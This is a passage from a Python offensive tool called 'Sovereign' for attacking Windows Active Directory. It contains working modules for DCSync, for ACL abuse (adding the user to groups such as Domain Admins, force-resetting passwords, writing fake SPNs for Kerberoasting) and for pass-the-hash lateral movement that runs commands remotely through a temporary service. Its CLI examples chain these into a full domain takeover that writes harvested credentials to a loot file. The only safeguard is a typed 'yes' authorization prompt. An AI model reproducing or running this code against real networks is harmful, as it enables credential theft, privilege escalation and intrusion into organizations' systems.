                                            notes="Need DS-Replication-Get-Changes-All privilege. "
                                                  "Grant with: Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=com' "
                                                  "-Rights DCSync -PrincipalIdentity {your_user}"))
            else:
                _log(f"[DCSync] Error: {exc}", "ERR")
                results.append(AttackResult("dcsync", "domain_dump", "FAILED", notes=err))
        return results


# ── Module 5: ACL Abuse ───────────────────────────────────────────────────────

class ACLAbuseModule:
    """Exploit AD ACL misconfigurations: GenericAll, WriteDACL, GenericWrite, WriteOwner."""

    def run(self, ctx: EngagementContext, target_user: str = "",
            abuse_right: str = "auto") -> List[AttackResult]:
        results: List[AttackResult] = []
        if not LDAP3:
            return [AttackResult("acl-abuse", "setup", "FAILED",
                                 notes="Install ldap3: pip install ldap3")]
        if not ctx.ldap_conn and not _ldap_connect(ctx):
            return [AttackResult("acl-abuse", "connect", "FAILED")]

        if not target_user:
            return [AttackResult("acl-abuse", "config", "FAILED",
                                 notes="Specify target with --acl-target (e.g., 'Domain Admins' or username)")]

        # Find target DN
        is_group = True
        entries = _ldap_search(ctx, f"(sAMAccountName={target_user})",
                               ["distinguishedName","objectClass"])
        if not entries:
            entries = _ldap_search(ctx, f"(cn={target_user})", ["distinguishedName","objectClass"])
            if not entries:
                return [AttackResult("acl-abuse", "target_lookup", "FAILED",
                                     notes=f"Cannot find '{target_user}' in AD")]

        target_dn = str(entries[0].distinguishedName)
        obj_class  = [str(c) for c in (getattr(entries[0], "objectClass", []) or [])]
        is_group   = "group" in obj_class

        # Get our own DN
        self_entries = _ldap_search(ctx, f"(sAMAccountName={ctx.username})",
                                    ["distinguishedName"])
        self_dn = str(self_entries[0].distinguishedName) if self_entries else ""

        _log(f"[ACL] Target: {target_dn} (group={is_group})", "INFO")

        # Detect right automatically based on what we have
        right = abuse_right.lower()

        if right in ("auto", "genericall", "addmember") and is_group:
            results.extend(self._add_member(ctx, target_dn, self_dn, target_user))
        elif right in ("auto", "genericall", "forcechangepassword") and not is_group:
            results.extend(self._force_change_password(ctx, target_dn, target_user))
        elif right in ("genericwrite", "writespn"):
            results.extend(self._write_spn(ctx, target_dn, target_user))
        elif right in ("writedacl",):
            results.extend(self._grant_full_control(ctx, target_dn, self_dn, target_user))
        else:
            # Try all applicable abuses
            if is_group:
                results.extend(self._add_member(ctx, target_dn, self_dn, target_user))
            else:
                results.extend(self._force_change_password(ctx, target_dn, target_user))

        return results

    def _add_member(self, ctx: EngagementContext, group_dn: str,
                    member_dn: str, group_name: str) -> List[AttackResult]:
        try:
            from ldap3 import MODIFY_ADD
            result = ctx.ldap_conn.modify(
                group_dn,
                {"member": [(MODIFY_ADD, [member_dn])]}
            )
            if ctx.ldap_conn.result["result"] == 0:
                _log(f"[ACL] Added {ctx.username} to {group_name}!", "CRIT")
                return [AttackResult("acl-abuse", "add_member", "SUCCESS",
                                     target=group_name, severity="CRITICAL",
                                     notes=f"Added '{ctx.username}' to '{group_name}'. "
                                           f"Re-auth to get new group membership token.")]
            else:
                return [AttackResult("acl-abuse", "add_member", "FAILED",
                                     target=group_name,
                                     notes=f"LDAP error: {ctx.ldap_conn.result}")]
        except Exception as exc:
            return [AttackResult("acl-abuse", "add_member", "FAILED",
                                 target=group_name, notes=str(exc))]

    def _force_change_password(self, ctx: EngagementContext, user_dn: str,
                                username: str) -> List[AttackResult]:
        new_pass = f"Sovereign!{random.randint(1000,9999)}"
        try:
            from ldap3 import MODIFY_REPLACE, MODIFY_DELETE, MODIFY_ADD
            new_pass_enc = f'"{new_pass}"'.encode("utf-16-le")
            result = ctx.ldap_conn.modify(
                user_dn,
                {"unicodePwd": [(MODIFY_REPLACE, [new_pass_enc])]}
            )
            if ctx.ldap_conn.result["result"] == 0:
                _log(f"[ACL] Password changed for {username}: {new_pass}", "CRIT")
                ctx.credentials.append(Credential(
                    "ldap_force_password", ctx.domain, username, new_pass,
                    "acl_abuse_force_change_password",
                    notes=f"Password force-changed via WriteDACL/GenericAll"
                ))
                return [AttackResult("acl-abuse", "force_password", "SUCCESS",
                                     target=username, severity="CRITICAL",
                                     data={"username": username, "new_password": new_pass},
                                     notes=f"Password for '{username}' reset to '{new_pass}'")]
            else:
                return [AttackResult("acl-abuse", "force_password", "FAILED",
                                     target=username,
                                     notes=f"LDAP error: {ctx.ldap_conn.result}")]
        except Exception as exc:
            return [AttackResult("acl-abuse", "force_password", "FAILED",
                                 target=username, notes=str(exc))]

    def _write_spn(self, ctx: EngagementContext, user_dn: str,
                   username: str) -> List[AttackResult]:
        """Write a fake SPN to enable targeted Kerberoasting."""
        try:
            from ldap3 import MODIFY_REPLACE
            fake_spn = f"http/{username}.{ctx.domain}:80/{username}"
            result = ctx.ldap_conn.modify(
                user_dn,
                {"servicePrincipalName": [(MODIFY_REPLACE, [fake_spn])]}
            )
            if ctx.ldap_conn.result["result"] == 0:
                _log(f"[ACL] SPN written for {username}: {fake_spn}. Now Kerberoastable!", "CRIT")
                return [AttackResult("acl-abuse", "write_spn", "SUCCESS",
                                     target=username, severity="CRITICAL",
                                     data={"spn": fake_spn},
                                     notes=f"SPN '{fake_spn}' written to '{username}'. "
                                           f"Now run: --modules kerberoast to extract TGS hash")]
            else:
                return [AttackResult("acl-abuse", "write_spn", "FAILED",
                                     target=username,
                                     notes=str(ctx.ldap_conn.result))]
        except Exception as exc:
            return [AttackResult("acl-abuse", "write_spn", "FAILED",
                                 target=username, notes=str(exc))]

    def _grant_full_control(self, ctx: EngagementContext, target_dn: str,
                             self_dn: str, target_name: str) -> List[AttackResult]:
        return [AttackResult("acl-abuse", "writedacl", "PARTIAL",
                             target=target_name,
                             notes=f"WriteDACL on {target_dn}: use PowerView → "
                                   f"Add-DomainObjectAcl -TargetIdentity '{target_dn}' "
                                   f"-Rights All -PrincipalIdentity '{ctx.username}'")]


# ── Module 6: Lateral Movement ─────────────────────────────────────────────────

class LateralModule:
    """Pass-the-Hash via SMB, WMI command execution."""

    def run(self, ctx: EngagementContext, target: str,
            command: str = "whoami /all") -> List[AttackResult]:
        if not IMPACKET:
            return [AttackResult("lateral", "setup", "FAILED",
                                 notes="Install impacket: pip install impacket")]
        results: List[AttackResult] = []
        results.extend(self._pth_smb(ctx, target, command))
        return results

    def _pth_smb(self, ctx: EngagementContext, target: str,
                  command: str) -> List[AttackResult]:
        lm_h = ctx.lm_hash or "aad3b435b51404eeaad3b435b51404ee"
        nt_h = ctx.nt_hash or ""
        _log(f"[Lateral] PTH → {target} as {ctx.domain}\\{ctx.username}", "INFO")

        try:
            from impacket.dcerpc.v5 import scmr
            conn = SMBConnection(target, target, timeout=10)
            conn.login(ctx.username, ctx.password or "",
                       ctx.domain, lm_h, nt_h)
            _log(f"[Lateral] SMB authenticated to {target}", "OK")

            # PSExec-style execution
            rpct = transport.SMBTransport(target, 445, filename=r"\svcctl",
                                          smb_connection=conn)
            dce = rpct.get_dce_rpc()
            dce.connect()
            dce.bind(scmr.MSRPC_UUID_SCMR)
            hScm = scmr.hROpenSCManagerW(dce)["lpScHandle"]

            svc_name = f"sv{random.randint(1000,9999)}"
            out_file  = f"\\Windows\\Temp\\{svc_name}.txt"
            cmd_line  = f"cmd.exe /c {command} > {out_file} 2>&1"
            try:
                hSvc = scmr.hRCreateServiceW(
                    dce, hScm, svc_name, svc_name,
                    lpBinaryPathName=cmd_line
                )["lpServiceHandle"]
                scmr.hRStartServiceW(dce, hSvc)
                time.sleep(2)
                scmr.hRDeleteService(dce, hSvc)
                scmr.hRCloseServiceHandle(dce, hSvc)
            except Exception:
                pass

            # Read output
            output = ""
            try:
                buf = []
                conn.getFile("C$",
                             out_file.replace("\\Windows\\Temp\\", "Windows\\Temp\\"),
                             lambda d: buf.append(d))
                output = b"".join(buf).decode("utf-8", errors="replace")
                _log(f"[Lateral] Command output:\n{output[:300]}", "CRIT")
            except Exception:
                output = "(output file not readable)"

            ctx.loot.setdefault("lateral", []).append({
                "target": target, "user": ctx.username, "command": command,
                "output": output[:500],
            })
            dce.disconnect()
            conn.close()
            return [AttackResult("lateral", "pth_exec", "SUCCESS",
                                 target=target, severity="CRITICAL",
                                 data={"target": target, "command": command, "output": output[:300]},
                                 notes=f"PTH exec on {target} as {ctx.domain}\\{ctx.username}")]

        except Exception as exc:
            err = str(exc)
            _log(f"[Lateral] {target}: {err}", "ERR")
            return [AttackResult("lateral", "pth_exec", "FAILED",
                                 target=target, notes=err)]


# ── Output ─────────────────────────────────────────────────────────────────────

def print_banner() -> None:
    if PYFIGLET:
        import pyfiglet as pf
        print(f"\033[35m{pf.figlet_format('Sovereign', font='slant')}\033[0m")
    else:
        print(f"\033[35m\n  {TOOL_NAME} v{VERSION}\n\033[0m")
    print(f"\033[36m  Author: {AUTHOR}  |  Windows & Active Directory Offensive Suite\033[0m\n")

def print_legal(yes: bool) -> bool:
    print(f"\033[33m{LEGAL_WARNING}\033[0m")
    if yes:
        return True
    try:
        ans = input("  Type 'yes' to confirm written authorization: ").strip().lower()
        return ans == "yes"
    except (KeyboardInterrupt, EOFError):
        return False

def dump_results(ctx: EngagementContext, output: Optional[str]) -> None:
    total = len(ctx.results)
    success = sum(1 for r in ctx.results if r.status == "SUCCESS")
    crit    = sum(1 for r in ctx.results if r.severity == "CRITICAL")
    print(f"\n\033[35m{'═'*60}\n  AD ENGAGEMENT RESULTS\n{'═'*60}\033[0m")
    print(f"  Total  : {total} | Success: \033[32m{success}\033[0m | Critical: \033[35m{crit}\033[0m\n")

    for r in ctx.results:
        icons = {"SUCCESS":"\033[32m[+]","FAILED":"\033[31m[x]",
                 "PARTIAL":"\033[33m[~]","INFO":"\033[36m[*]"}
        c = icons.get(r.status, "   "); reset = "\033[0m"
        tgt = f" → {r.target}" if r.target else ""
        print(f"  {c}{reset} [{r.module}] {r.action}{tgt}")
        if r.notes: print(f"        {r.notes}")

    if ctx.credentials:
        print(f"\n\033[32m[+] CREDENTIALS ({len(ctx.credentials)})\033[0m")
        for c in ctx.credentials:
            print(f"  [{c.type}] {c.domain}\\{c.username}: {c.secret[:60]}")

    if output:
        payload = {
            "tool": TOOL_NAME, "version": VERSION,
            "domain": ctx.domain, "dc_ip": ctx.dc_ip,
            "results": [{"module":r.module,"action":r.action,"status":r.status,
                         "target":r.target,"severity":r.severity,"notes":r.notes}
                        for r in ctx.results],
            "credentials": [{"type":c.type,"domain":c.domain,"username":c.username,
                              "secret":c.secret,"notes":c.notes} for c in ctx.credentials],
            "loot": ctx.loot,
        }
        Path(output).write_text(json.dumps(payload, indent=2, default=str), encoding="utf-8")
        print(f"\n\033[32m[+] Results saved → {output}\033[0m")


# ── CLI ────────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog=COMMAND,
        description=f"{TOOL_NAME} v{VERSION}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(f"""
        Examples:
          # Full AD enumeration (users, SPNs, admins, trusts, policy)
          python {COMMAND}.py --dc-ip 10.0.0.1 --domain corp.local -u admin -p Password1 --modules enum

          # Kerberoasting → save hashcat-compatible hashes
          python {COMMAND}.py --dc-ip 10.0.0.1 --domain corp.local -u user -p pass --modules kerberoast

          # AS-REP roasting (no creds needed if you have a user list)
          python {COMMAND}.py --dc-ip 10.0.0.1 --domain corp.local --modules asreproast --users users.txt

          # DCSync — dump all domain hashes (requires DA)
          python {COMMAND}.py --dc-ip 10.0.0.1 --domain corp.local -u Administrator --hashes LM:NT --modules dcsync

          # Pass-the-Hash lateral movement
          python {COMMAND}.py --dc-ip 10.0.0.1 --domain corp.local -u Administrator --hashes LM:NT --modules lateral --target 10.0.0.5

          # ACL abuse: add yourself to Domain Admins
          python {COMMAND}.py --dc-ip 10.0.0.1 --domain corp.local -u lowpriv -p pass --modules acl-abuse --acl-target "Domain Admins"

          # Full attack chain
          python {COMMAND}.py --dc-ip 10.0.0.1 --domain corp.local -u user -p pass --modules all --output loot.json
        """),
    )
    p.add_argument("--dc-ip",    required=True, help="Domain Controller IP")
    p.add_argument("--domain",   required=True, help="FQDN (e.g., corp.local)")
    p.add_argument("-u","--username", default="", help="Username")
    p.add_argument("-p","--password", default="", help="Password")
    p.add_argument("--hashes",   default="", help="NTLM hashes LM:NT (for PTH)")
    p.add_argument("--modules",  nargs="+",
                   choices=["enum","kerberoast","asreproast","dcsync","acl-abuse","lateral","all"],
                   default=["enum"])
    p.add_argument("--target",   default="", help="Target host for lateral movement")
    p.add_argument("--command",  default="whoami /all", help="Command for lateral module")
    p.add_argument("--users",    default="", help="File with usernames for AS-REP roasting")
    p.add_argument("--acl-target", default="", help="Target object for ACL abuse (user or group name)")
    p.add_argument("--acl-right",  default="auto",
                   choices=["auto","genericall","addmember","forcechangepassword","writespn","writedacl"])
    p.add_argument("--dcsync-user", default="", help="Single user to DCSync (empty = all)")
    p.add_argument("--output","-o", help="Save results to JSON file")
    p.add_argument("--yes","-y", action="store_true")
    p.add_argument("--version",  action="version", version=f"{TOOL_NAME} v{VERSION}")
    return p


def main() -> int:
    parser = build_parser()
    args   = parser.parse_args()

    print_banner()
    if not print_legal(args.yes):
        print("Aborted.")
        return 1

    lm_hash = nt_hash = ""
    if args.hashes and ":" in args.hashes:
        lm_hash, nt_hash = args.hashes.split(":", 1)

    ctx = EngagementContext(
        dc_ip=args.dc_ip, domain=args.domain,
        username=args.username, password=args.password,
        lm_hash=lm_hash, nt_hash=nt_hash,
        base_dn=_domain_to_dn(args.domain),
    )

    run_all = "all" in args.modules
    modules_to_run = ["enum","kerberoast","asreproast","dcsync","acl-abuse","lateral"] \
                     if run_all else args.modules

    module_map = {
        "enum":       EnumModule(),
        "kerberoast": KerberoastModule(),
        "asreproast": ASREPRoastModule(),
        "dcsync":     DCsyncModule(),
        "acl-abuse":  ACLAbuseModule(),
        "lateral":    LateralModule(),
    }

    # Load user list for AS-REP roasting
    if args.users and Path(args.users).exists():
        ctx.loot["asrep_accounts"] = Path(args.users).read_text().splitlines()

    for mod_name in modules_to_run:
        mod = module_map.get(mod_name)
        if not mod:
            continue
        _log(f"Running module: {mod_name.upper()}", "INFO")
        try:
            if mod_name == "kerberoast":
                results = mod.run(ctx, output_file=args.output.replace(".json","_krb.txt") if args.output else "")
            elif mod_name == "asreproast":
                results = mod.run(ctx, output_file=args.output.replace(".json","_asrep.txt") if args.output else "")
            elif mod_name == "dcsync":
                results = mod.run(ctx, target_user=args.dcsync_user,
                                  output_file=args.output.replace(".json","_ntds") if args.output else "")
            elif mod_name == "acl-abuse":
                results = mod.run(ctx, target_user=args.acl_target, abuse_right=args.acl_right)
            elif mod_name == "lateral":
                if not args.target:
                    _log("[Lateral] --target required", "WARN")
                    continue
                results = mod.run(ctx, target=args.target, command=args.command)
            else:
                results = mod.run(ctx)
            ctx.results.extend(results)
        except Exception as exc:
            _log(f"Module {mod_name} error: {exc}", "ERR")
            ctx.results.append(AttackResult(mod_name, "run", "FAILED", notes=str(exc)))

    dump_results(ctx, args.output)
    return 0


if __name__ == "__main__":
    sys.exit(main())
